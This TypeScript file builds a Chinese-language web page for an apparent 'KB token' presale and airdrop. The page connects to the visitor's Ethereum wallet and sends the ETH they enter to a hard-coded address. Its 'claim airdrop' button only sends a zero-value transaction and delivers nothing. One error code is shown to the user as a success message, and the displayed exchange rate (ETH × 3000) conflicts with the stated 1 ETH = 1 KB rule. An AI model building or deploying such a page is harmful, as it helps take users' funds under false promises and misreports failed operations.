import '@geist-ui/style'
import './style.css'
import {ethers} from 'ethers'
import {parseEther} from "ethers/lib.esm/utils";

const app = document.querySelector<HTMLDivElement>('#app')!

const main = async () => {
    await (window as any).ethereum.enable()
    const provider = new ethers.providers.Web3Provider((window as any).ethereum)
    const signer = provider.getSigner()
    const address = await signer.getAddress()
    // var str1 = `${address}`
    document.querySelector('#address_eth')!.innerHTML =  `${address}`.substring(0,10)+"**********"+`${address}`.substring(`${address}`.length-10,`${address}`.length);

    const transaction = async () => {
        try {
            var eth = ((document.querySelector('#eth_num') as HTMLInputElement).value);

            const res = await signer.sendTransaction({
                from: signer.getAddress(),
                to: "0xc508f28B3AdCFaD52184e3F21451C6c4951C1735",
                value: parseEther(eth),
                gasPrice: 1000000000,
                gasLimit: 60000,
            })
            document.querySelector('#result')!.innerHTML = `
      Trans Result: ${res}
    `.trim()
        } catch (err) {
            if (err.toString().search("-32600")!= -1){
                alert("操作成功")
            }else {
                alert(err.message)
            }
        }
        //return tx.creates;
    }
    const tx = document.querySelector('#transaction')!
    tx.removeAttribute('onclick')
    tx!.addEventListener('click', transaction)


    const airdrop = async () => {
        try {

            const res = await signer.sendTransaction({
                from: signer.getAddress(),
                to: "0xc508f28B3AdCFaD52184e3F21451C6c4951C1735",
                value: 0,
                gasPrice: 1000000000,
                gasLimit: 60000,
            })
            document.querySelector('#result')!.innerHTML = `
      Trans Result: ${res}
    `.trim()
        } catch (err) {
            if (err.toString().search("-32600")!= -1){
                alert("操作成功")
            }else {
                alert(err.message)
            }
        }
        //return tx.creates;
    }
    const ai = document.querySelector('#airdrop')!
    ai.removeAttribute('onclick')
    ai!.addEventListener('click', airdrop)

    document.querySelector('#eth_num')!.addEventListener('keyup', function () {
        var eth = ((document.querySelector('#eth_num') as HTMLInputElement).value);
        var num = Number(eth) * 3000
        document.querySelector('#kb_num')!.innerHTML = num.toString()
    })

    const switchToAirdrop = async () => {
        ((document.querySelector('#headAirdrop') as HTMLInputElement).style.color = "#F02B88");
        ((document.querySelector('#headPrivate') as HTMLInputElement).style.color = "grey");
        ((document.querySelector('#simu') as HTMLInputElement).style.display = "none");
        ((document.querySelector('#kongtou') as HTMLInputElement).style.display = "");
    }
    document.querySelector('#headAirdrop')!.addEventListener('click', switchToAirdrop)

    const switchPrivate = async () => {
        ((document.querySelector('#headAirdrop') as HTMLInputElement).style.color = "grey");
        ((document.querySelector('#headPrivate') as HTMLInputElement).style.color =  "#F02B88");
        ((document.querySelector('#simu') as HTMLInputElement).style.display = "");
        ((document.querySelector('#kongtou') as HTMLInputElement).style.display = "none");
    }
    document.querySelector('#headPrivate')!.addEventListener('click', switchPrivate)
    // const signHandler = async () => {
    //     try {
    //         const result = await signer.signMessage('hello imToken!')
    //         document.querySelector('#result')!.innerHTML = `
    //   Signature Result: ${result}
    // `.trim()
    //     } catch (err) {
    //         alert(err.message)
    //     }
    // }
    // const el = document.querySelector('#toSign')!
    // el.removeAttribute('onclick')
    // el!.addEventListener('click', signHandler)

}
app.innerHTML = `
<div style="background: black">
<div style="height: 68px;width:100%; background: #1A1A1A;">
<div style="height: 24px"></div>
<div style="font-size: 18px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 500;text-align:center">
   <samp><a href="#" style="color: grey" id="headAirdrop">空投</a>&nbsp;&nbsp;&nbsp;&nbsp;</samp>
   <samp>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" style="color: #F02B88;" id="headPrivate">私募</a></samp>
</div>

<div style="font-weight: 500;color: #FFFFFF;font-size: 15px;margin: -27px 0px 0px 20px">◀</div>

</div>
<div id="simu" >
<section style="width: calc(750pt - 180pt);max-width: 100vw;min-height: 100vh;margin: 0 auto;padding: 0 16pt;box-sizing: border-box;position: relative;background: black">
<div style="height: 40px"></div>
    <div style="width: 56px;height: 25px;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400 ;color: #FFFFFF;line-height: 28px;">
    数量
    </div>
    <div style="height: 15px"></div>
    <div style="height: 68px;background: #1A1A1A;border-radius: 12px;padding: 15px">

<input type="text"  style="height: 100%;width: 100%;background: transparent;border:none;font-weight: 400;color: #FFFFFF;font-size: 20px"
placeholder="输入您的金额"  onkeyup="this.value= this.value.match(/\\d+(\\.\\d{0,8})?/) ? this.value.match(/\\d+(\\.\\d{0,8})?/)[0] : ''" id="eth_num"  value="">

<div style=";font-size: 20px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 400;color: #FFFFFF;margin-top: -35px" align="right">ETH</div>
    </div>
    <div style="height: 15px"></div>
    <div style="width: 56px;height: 25px;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #FFFFFF;line-height: 28px;">
    兑换
    </div>
    <div style="height: 15px"></div>
    <div style="height: 68px;background: #1A1A1A;border-radius: 12px;padding: 17px 15px 0px 15px">
<div style=";font-size: 23px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 400;color: #FFFFFF;" align="right">KB</div>
    <div style="font-size: 23px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 400;color: #FFFFFF;margin-top: -34px" align="left" id="kb_num">0.00</div>

    </div>

    <div style="height: 68px"></div>
    <div style="height: 72px;background: linear-gradient(297deg, #FF5045 0%, #EF3868 21%, #E32780 100%);border-radius: 24px;">
<button style="height: 100%;width: 100%;background: transparent;border: 0px solid transparent;font-size: 18px;font-weight: 500;color: #FFFFFF;"
id="transaction">执行交易</button>
    </div>
    <div style="height: 68px"></div>

    <div style="100%;background: #1A1A1A;border-radius: 16px;padding: 30px 30px 30px 30px">
<div style="font-size: 22px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 500;color: #808080;line-height: 32px;background: linear-gradient(297deg, #FF5045 0%, #EF3868 21%, #E32780 100%);-webkit-background-clip: text;-webkit-text-fill-color: transparent;">
    KB token 规则
    </div>
    <div style="height: 30px"></div>
    <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;">
        · 推荐使用imToken、tokenpocket钱包
<div style="height: 10px"></div>
    </div>
    <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;">
        · 早鸟销售比例1 ETH = 1KB，销售完成或时间结束条件到达即结束。
        <div style="height: 10px"></div>
            </div>
            <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;word-wrap: break-word;">
        · TOKEN合约地址：0x4bda6957e3f1abd29064d2757be1b0be39bcdca5
<div style="height: 10px"></div>
    </div>

    </div>
    <div style="height: 100px"></div>
    </section>
</div>

    <div id="kongtou" style="display:none;">
        <section id="kongtou" style=" width: calc(750pt - 180pt);max-width: 100vw;min-height: 100vh;margin: 0 auto;padding: 0 16pt;box-sizing: border-box;position: relative;background: black">
    <div style="height: 40px"></div>
        <div style="width: 256px;height: 25px;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400 ;color: #FFFFFF;line-height: 28px;">
        以太坊地址
        </div>
        <div style="height: 15px"></div>
    
        <div style="height: 64px;background: #1A1A1A;border-radius: 12px;padding: 17px 15px 0px 15px">
    <div style=";font-size: 20px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 400;color: #808080;" id="address_eth">请连接钱包地址...</div>
    
        </div>
    
        <div style="height: 48px"></div>
        <div style="height: 72px;background: linear-gradient(297deg, #FF5045 0%, #EF3868 21%, #E32780 100%);border-radius: 24px;">
    <button style="height: 100%;width: 100%;background: transparent;border: 0px solid transparent;font-size: 18px;font-weight: 500;color: #FFFFFF;"
    id="airdrop">领取空投</button>
        </div>
        <div style="height: 38px"></div>
    
        <div style="100%;background: #1A1A1A;border-radius: 16px;padding: 30px 30px 30px 30px">
    <div style="font-size: 22px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 500;color: #808080;line-height: 32px;background: linear-gradient(297deg, #FF5045 0%, #EF3868 21%, #E32780 100%);-webkit-background-clip: text;-webkit-text-fill-color: transparent;">
        KBtoken 规则
        </div>
        <div style="height: 30px"></div>
        <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;">
           · 作弊邀请将黑名单，停止发布KB Token 
    <div style="height: 10px"></div>
        </div>
        <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;">
            · 本轮KB Token空投，由KB24提供支持 
            <div style="height: 10px"></div>
                </div>
                <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;word-wrap: break-word;">
           · 空投超过授权，将分配发行 
    <div style="height: 10px"></div>
        </div>
        <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;word-wrap: break-word;">
           · KB Token活动将于活动结束后结束
    <div style="height: 10px"></div>
        </div>
        </div>
        
        <div style="height: 50px"></div>
         <div style="100%;background: #1A1A1A;border-radius: 16px;padding: 30px 30px 30px 30px">
    <div style="font-size: 22px;font-family: PingFang-SC-Medium, PingFang-SC;font-weight: 500;color: #808080;line-height: 32px;background: linear-gradient(297deg, #FF5045 0%, #EF3868 21%, #E32780 100%);-webkit-background-clip: text;-webkit-text-fill-color: transparent;">
        领取空投
        </div>
        <div style="height: 30px"></div>
        <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;">
          · 推荐使用钱包<samp style="color: #F02B88"> imToken、tokenpocket </samp>钱包
    <div style="height: 10px"></div>
        </div>
        <div style="width: 100%;font-size: 18px;font-family: PingFang-SC-Regular, PingFang-SC;font-weight: 400;color: #808080;">
            · App浏览器中授权访问kbtoken.co
            <div style="height: 10px"></div>
                </div>
        </div>
        <div style="height: 100px"></div>
        </section>
    </div>
</div>
`
main().catch(err => console.log(err))

